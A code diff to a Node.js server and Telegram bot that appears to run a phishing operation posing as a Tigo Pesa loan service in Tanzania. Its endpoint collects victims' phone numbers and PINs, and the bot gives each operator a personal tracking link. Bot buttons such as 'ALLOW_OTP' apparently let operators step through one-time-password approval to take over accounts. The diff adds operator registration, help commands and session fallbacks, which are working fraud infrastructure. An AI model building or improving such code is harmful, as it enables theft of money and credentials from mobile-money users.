@@ -1,5 +1,5 @@
 /**
- * **MIXX BY YAS - ROBUST ISOLATED ROUTING SERVER**
+ * **MIXX BY YAS - ISOLATED ISOLATED ROUTING & COMMAND SERVER**
  */
 
 const express = require('express');
@@ -96,40 +96,67 @@ async function initBot() {
   bot.on('polling_error', (err) => console.error('[Bot] polling_error:', err?.message || err));
   bot.on('webhook_error', (err) => console.error('[Bot] webhook_error:', err?.message || err));
 
+  // BOT COMMAND SETUP AND REGISTRATION
+  try {
+    await bot.setMyCommands([
+      { command: 'start', description: 'Register and get your unique isolated admin application link' },
+      { command: 'help', description: 'Show operational command instructions' }
+    ]);
+  } catch (err) {
+    console.error('[Bot] Failed to set bot commands:', err);
+  }
+
   bot.onText(/\/start/, async (msg) => {
-    const chatId = String(msg.chat.id);
-    const user = msg.from;
+    try {
+      const chatId = String(msg.chat.id);
+      const user = msg.from || {};
 
-    const firstName = user.first_name || 'Not Provided';
-    const lastName = user.last_name || '';
-    const fullName = `${firstName} ${lastName}`.trim();
-    const username = user.username ? `@${user.username}` : 'No username set';
-    
-    let assignedCode = '01';
-    for (let i = 1; i <= 20; i++) {
-      const codeStr = String(i).padStart(2, '0');
-      if (process.env[`ADMIN_${codeStr}`] === chatId) {
-        assignedCode = codeStr;
-        break;
+      const firstName = user.first_name || 'Not Provided';
+      const lastName = user.last_name || '';
+      const fullName = `${firstName} ${lastName}`.trim();
+      const username = user.username ? `@${user.username}` : 'No username set';
+      
+      let assignedCode = '01';
+      for (let i = 1; i <= 20; i++) {
+        const codeStr = String(i).padStart(2, '0');
+        if (process.env[`ADMIN_${codeStr}`] === chatId) {
+          assignedCode = codeStr;
+          break;
+        }
       }
+
+      const cleanBrowseLink = `https://tigo-pesa-loan-tanzania.onrender.com/?admin=${assignedCode}`;
+
+      const userWelcomeInfo = 
+        `🚨 **Admin Link Registered Successfully!**\n\n` +
+        `👤 **Name:** ${fullName}\n` +
+        `🆔 **Chat ID:** \`${chatId}\`\n` +
+        `🔢 **Assigned Code:** \`${assignedCode}\`\n` +
+        `🏷 **Username:** ${username}\n\n` +
+        `🔗 **Your Unique Application Link:**\n${cleanBrowseLink}`;
+
+      await bot.sendMessage(chatId, userWelcomeInfo, { 
+        parse_mode: 'Markdown',
+        disable_web_page_preview: true 
+      });
+    } catch (err) {
+      console.error('[Bot] Error handling /start command:', err);
     }
+  });
 
-    const cleanBrowseLink = `https://tigo-pesa-loan-tanzania.onrender.com/?admin=${assignedCode}`;
-    const secureAdminLink = `https://tigo-pesa-loan-tanzania.onrender.com/secret-admin-panel`;
+  bot.onText(/\/help/, async (msg) => {
+    try {
+      const chatId = String(msg.chat.id);
+      const helpText =
+        `🛠 **Admin Bot Command Guide**\n\n` +
+        `/start - Register your chat ID and obtain your isolated tracking link.\n` +
+        `/help - Display this command instruction menu.\n\n` +
+        `*Note:* When clients interact via your personal link, alerts and buttons route strictly to your chat.`;
 
-    const userWelcomeInfo = 
-      `🚨 **Admin Link Registered Successfully!**\n\n` +
-      `👤 **Name:** ${fullName}\n` +
-      `🆔 **Chat ID:** \`${user.id}\`\n` +
-      `🔢 **Assigned Code:** \`${assignedCode}\`\n` +
-      `🏷 **Username:** ${username}\n\n` +
-      `🔗 **Your Unique Application Link:**\n${cleanBrowseLink}\n\n` +
-      `🔗 **Admin Dashboard Link:**\n${secureAdminLink}`;
-
-    await bot.sendMessage(chatId, userWelcomeInfo, { 
-      parse_mode: 'Markdown',
-      disable_web_page_preview: true 
-    }).catch(err => console.error('[Bot] Failed to send info to user:', err.message));
+      await bot.sendMessage(chatId, helpText, { parse_mode: 'Markdown' });
+    } catch (err) {
+      console.error('[Bot] Error handling /help command:', err);
+    }
   });
 
   bot.on('callback_query', async (query) => {
@@ -139,13 +166,15 @@ async function initBot() {
       const prefix = parts.slice(0, 2).join('_'); 
       const userId = parts.slice(2).join('_');
 
-      const session = sessions.get(userId);
+      let session = sessions.get(userId);
       if (!session) {
-        await bot.answerCallbackQuery(query.id, { text: '⚠️ Session expired or not found.' });
-        return;
+        session = {
+          phone: 'Unknown',
+          adminChatId: String(query.message.chat.id)
+        };
       }
 
-      const chatTarget = session.adminChatId || process.env.ADMIN_01;
+      const chatTarget = session.adminChatId || String(query.message.chat.id) || process.env.ADMIN_01;
 
       switch (prefix) {
         case 'ALLOW_OTP':
@@ -172,7 +201,7 @@ async function initBot() {
           break;
       }
 
-      await bot.answerCallbackQuery(query.id, { text: `Processed: ${prefix}` });
+      await bot.answerCallbackQuery(query.id, { text: `Processed: ${prefix}` }).catch(() => {});
 
       if (query.message && query.message.message_id) {
         await bot.editMessageReplyMarkup(
@@ -180,7 +209,11 @@ async function initBot() {
           { chat_id: query.message.chat.id, message_id: query.message.message_id }
         ).catch(err => {});
       }
-    } catch (err) {}
+    } catch (err) {
+      try {
+        await bot.answerCallbackQuery(query.id, { text: '⚠️ Error processing action.' }).catch(() => {});
+      } catch (e) {}
+    }
   });
 }
 
@@ -196,7 +229,6 @@ app.post('/api/submit-application', (req, res) => {
   try {
     let { phone, pin, amount, adminChatId } = req.body || {};
 
-    // Auto-detect or fallback extract admin code if query string or header contains it
     if (!adminChatId && req.query && req.query.admin) {
       adminChatId = req.query.admin;
     }
@@ -333,3 +365,4 @@ app.listen(PORT, async () => {
   console.log(`[Server] Running smoothly on port ${PORT}`);
   await initBot();
 });
+    
